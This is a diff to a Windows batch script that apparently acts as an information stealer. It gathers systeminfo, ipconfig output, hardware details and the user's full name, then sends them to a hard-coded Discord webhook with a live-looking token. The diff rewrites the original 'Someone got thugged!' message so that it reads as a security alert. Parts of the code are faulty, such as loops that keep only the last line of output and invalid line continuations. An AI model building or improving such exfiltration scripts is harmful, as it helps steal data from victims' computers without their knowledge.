@@ -19,17 +19,37 @@ if /I "%user_name%"=="adisa" (
 echo Gathering system information...
 
 :: Collect system information
+:: Get system information
 for /f "tokens=*" %%a in ('systeminfo') do set "sysinfo=%%a"
+
+:: Get network information
 for /f "tokens=*" %%a in ('ipconfig') do set "networkinfo=%%a"
+
+:: Get system model
 for /f "tokens=*" %%a in ('wmic computersystem get model') do set "systemmodel=%%a"
+
+:: Get CPU information
 for /f "tokens=*" %%a in ('wmic cpu get caption') do set "cpuinfo=%%a"
+
+:: Get RAM information
 for /f "tokens=*" %%a in ('wmic memorychip get capacity') do set "raminfo=%%a"
+
+:: Get user full name
 for /f "tokens=*" %%a in ('wmic useraccount where name="%user_name%" get fullname') do set "userfullname=%%a"
 
-:: Format message
-set "message=Someone got thugged! Here is the info about the computer:%n%User: %user_name%%n%Full Name: %userfullname%%n%System: %systemmodel%%n%CPU: %cpuinfo%%n%RAM: %raminfo%%n%Network Info: %networkinfo%%n%System Info: %sysinfo%"
+:: Format the message with better structure and additional info
+set "message=\
+**Alert: Unauthorized Access Detected!**%n%\
+Here is the detailed system information:%n%n\
+**User:** %user_name%%n%\
+**Full Name:** %userfullname%%n%\
+**System Model:** %systemmodel%%n%\
+**CPU:** %cpuinfo%%n%\
+**RAM Capacity:** %raminfo%%n%\
+**Network Configuration:** %networkinfo%%n%\
+**System Information:** %sysinfo%"
 
-:: Send info to Discord webhook
+:: Send information to Discord webhook with better formatting and content type
 powershell -Command "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1337159633239937115/KdOhG-AXg3ckXDIrmcWESldNObYb5dZ16S8F591bs12XlwFC7M_l754ukBqeyhvXcJwY' -Method Post -Body '{\"content\": \"%message%\"}' -ContentType 'application/json'"
 
 :: Download the repository
